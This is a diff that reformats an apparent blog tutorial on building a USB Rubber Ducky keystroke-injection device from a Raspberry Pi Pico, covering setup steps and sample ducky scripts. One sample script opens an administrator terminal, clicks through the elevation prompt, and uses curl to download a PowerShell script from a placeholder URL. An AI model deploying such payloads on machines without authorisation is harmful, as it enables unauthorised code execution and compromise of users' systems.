@@ -1,13 +1,6 @@
 # **USB Rubber Ducky using Raspberry PI Pico**
 
-#### **Table of Contents**
-
-1. What is Raspberry PI Pico?
-2. Why hackers use Raspberry Pi Pico?
-3. How to make USB Rubbery ducky using Raspberry PI pico.
-4. Summary.
-
-#### **What is Raspberry PI Pico?**
+## **What is Raspberry PI Pico?**
 
 The Raspberry Pi Pico is a microcontroller board developed by the Raspberry Pi Foundation, known for its popular line of single-board computers (SBCs) like the Raspberry Pi 4. The Raspberry Pi Pico was introduced in January 2021 and is designed to provide an affordable and accessible platform for embedded systems, electronics projects, and learning about microcontrollers.
 
@@ -27,7 +20,7 @@ The Raspberry Pi Pico is suitable for a wide range of applications, including ro
 
 Overall, the Raspberry Pi Pico is a versatile microcontroller board that provides an excellent platform for learning about embedded systems and developing various electronic projects.
 
-#### **Why hackers use Raspberry PI Pico?**
+## **Why hackers use Raspberry PI Pico?**
 
 1. **Penetration Testing and Security Research:** Ethical hackers, security researchers, and penetration testers may use Raspberry Pi Pico to assess the security of computer systems, networks, and IoT devices. They can use it to identify vulnerabilities and weaknesses in systems and report them to the owners for mitigation.
 2. **Exploiting Vulnerabilities:** Malicious hackers may use a Raspberry Pi Pico to exploit vulnerabilities in systems and gain unauthorized access. They can use the board to automate and script attacks, such as brute-force password cracking or launching malware.
@@ -37,39 +30,39 @@ Overall, the Raspberry Pi Pico is a versatile microcontroller board that provide
 6. **Network Attacks:** Raspberry Pi Pico can be used as a network tool to intercept or manipulate network traffic. For example, it could be programmed to act as a rogue access point, allowing attackers to perform man-in-the-middle attacks.
 7. **Educational and Skill Development:** It's worth noting that some individuals with a strong interest in technology may initially experiment with Raspberry Pi Pico for legitimate educational purposes but may later misuse their knowledge and skills for malicious activities.
 
-#### **How make USB Rubbery ducky using Raspberry PI pico.**
+## **How make USB Rubbery ducky using Raspberry PI pico**
 
-**Requirements:**
+### **Requirements**
 
 1. Raspberry Pi Pico
 2. Micro USB cable
 3. Any Text editor like Sublime/Notepad.
 
-**Setup:**
+### **Setup**
 
-1. First download the circuit python for your pico from [here](https://circuitpython.org/board/raspberry\_pi\_pico/).
+1\. First download the circuit python for your pico from [here](https://circuitpython.org/board/raspberry\_pi\_pico/).
 
 ![](../../../attachments/Screenshot 2023-09-29 090721.png)
 
 Note:- If you are using pico w then download this it from [here](https://circuitpython.org/board/raspberry\_pi\_pico\_w/).
 
-2. Connect your pico to system.
+2\. Connect your pico to system.
 
 ![](../../../attachments/Screenshot 2023-09-29 091159.png)
 
-3. Now copy paste the  `.uf2` circuit python file to pico. It will disconnect pico and automatically and connect it back to system automatically.
+3\. Now copy paste the  `.uf2` circuit python file to pico. It will disconnect pico and automatically and connect it back to system automatically.
 
 ![](../../../attachments/Screenshot 2023-09-29 091213.png)
 
-4. Now download the latest release of `adafruit-circuitpython-bundle-8.x-mpy-YYYYMMDD.zip` from [here](https://github.com/adafruit/Adafruit\_CircuitPython\_Bundle/releases/) and extract it on your system.
+4\. Now download the latest release of `adafruit-circuitpython-bundle-8.x-mpy-YYYYMMDD.zip` from [here](https://github.com/adafruit/Adafruit\_CircuitPython\_Bundle/releases/) and extract it on your system.
 
 ![](../../../attachments/Screenshot 2023-09-29 091315.png)
 
-5. Navigate to `lib` folder and copy the `adafruit_hid` folder to the pico.
+5\. Navigate to `lib` folder and copy the `adafruit_hid` folder to the pico.
 
 ![](../../../attachments/Screenshot 2023-10-02 112726.png)
 
-6. Now copy the following files and folder from `adafruit_hid/lib` to `lib` folder of pico.
+6\. Now copy the following files and folder from `adafruit_hid/lib` to `lib` folder of pico.
    1. `adafruit_debouncer.mpy`
    2. `adafruit_tricks.mpy`
    3. `addafruit_wsgi`
@@ -77,39 +70,39 @@ Note:- If you are using pico w then download this it from [here](https://circuit
 
 ![](../../../attachments/Screenshot 2023-10-02 112911.png)
 
-7. Now download the `pico-ducky.zip` from github [repository](https://github.com/dbisu/pico-ducky) and extract it.
+7\. Now download the `pico-ducky.zip` from github [repository](https://github.com/dbisu/pico-ducky) and extract it.
 
 ![](../../../attachments/Screenshot 2023-10-02 113006.png)
 
-8.  Now copy the following files from the pico-ducky folder to pico drive.
+8\.  Now copy the following files from the pico-ducky folder to pico drive.
 
-    1. `boot.py`
-    2. `duckyinpython.py`
-    3. `code.py`
-    4. `webapp.py`
-    5. `wsgiserver.py`
+1. `boot.py`
+2. `duckyinpython.py`
+3. `code.py`
+4. `webapp.py`
+5. `wsgiserver.py`
 
-    **From:**
-
-![](../../../attachments/Screenshot 2023-10-02 113116.png)
-
-&#x20;        **To:**&#x20;
+**From:**
 
 ![](../../../attachments/Screenshot 2023-10-02 113116.png)
 
-9. Now open any text editor you like and copy paste the following ducky script. for testing the pico-ducky only.
+**To:**
+
+![](../../../attachments/Screenshot 2023-10-02 113116.png)
+
+9\. Now open any text editor you like and copy paste the following ducky script. for testing the pico-ducky only.
 
 **Script:**
 
-`GUI r`&#x20;
+`GUI r`
 
-`DELAY 1000`&#x20;
+`DELAY 1000`
 
-`STRING notepad.exe`&#x20;
+`STRING notepad.exe`
 
-`ENTER`&#x20;
+`ENTER`
 
-`DELAY 1000`&#x20;
+`DELAY 1000`
 
 `STRING Hello World!`
 
@@ -119,7 +112,7 @@ And save it as `payload.dd` in pico drive.
 
 Now disconnect and reconnect the pico to test if it is working or not. If it is working it will open notepad and type `Hello World!` in it.
 
-10. Now you can write your own ducky script inside the `payload.dd` file and run it on any system.
+10\. Now you can write your own ducky script inside the `payload.dd` file and run it on any system.
 
 **Note: -** After saving the ducky script in payload.dd it will execute it immediately on connected system. So keep that in mind before writing the ducky script.
 
@@ -131,11 +124,11 @@ Now disconnect and reconnect the pico to test if it is working or not. If it is 
 
 [https://vimeo.com/870230398?share=copy](https://vimeo.com/870230398?share=copy)
 
-Script: -
+**Script:**
 
 `REM TO CLOSE OPENED FILE EXPLORER WE USE ALT F4`
 
-`ALT F4`&#x20;
+`ALT F4`
 
 `DELAY 500`
 
@@ -145,27 +138,27 @@ Script: -
 
 `STRING wt`
 
-`REM TO OPEN AS ADMINISTRATOR USING CONTROL SHIFT ENTER`&#x20;
+`REM TO OPEN AS ADMINISTRATOR USING CONTROL SHIFT ENTER`
 
 `CONTROL SHIFT ENTER`
 
-`DELAY 1000`&#x20;
+`DELAY 1000`
 
-`LEFT`&#x20;
+`LEFT`
 
 `DELAY 500`
 
-`ENTER`&#x20;
+`ENTER`
 
 `DELAY 1000`
 
 `STRING cd .\Downloads\`
 
-`ENTER`&#x20;
+`ENTER`
 
 `DELAY 500`
 
-`STRING curl URL/to/your/powershell/script -O script.ps1`&#x20;
+`STRING curl URL/to/your/powershell/script -O script.ps1`
 
 `ENTER`
 
@@ -181,7 +174,7 @@ Script: -
 
 `ENTER`
 
-#### **Summary:**
+## **Summary**
 
 In this blog post, we explore the Raspberry Pi Pico's versatility as a microcontroller board, discussing its programmable features. We investigate the motivations behind hackers and security enthusiasts choosing the Raspberry Pi Pico for ethical hacking and security testing. Furthermore, we provide a step-by-step guide on how to create a USB Rubber Ducky using the Raspberry Pi Pico, making it an accessible tool for various security and automation applications.
 
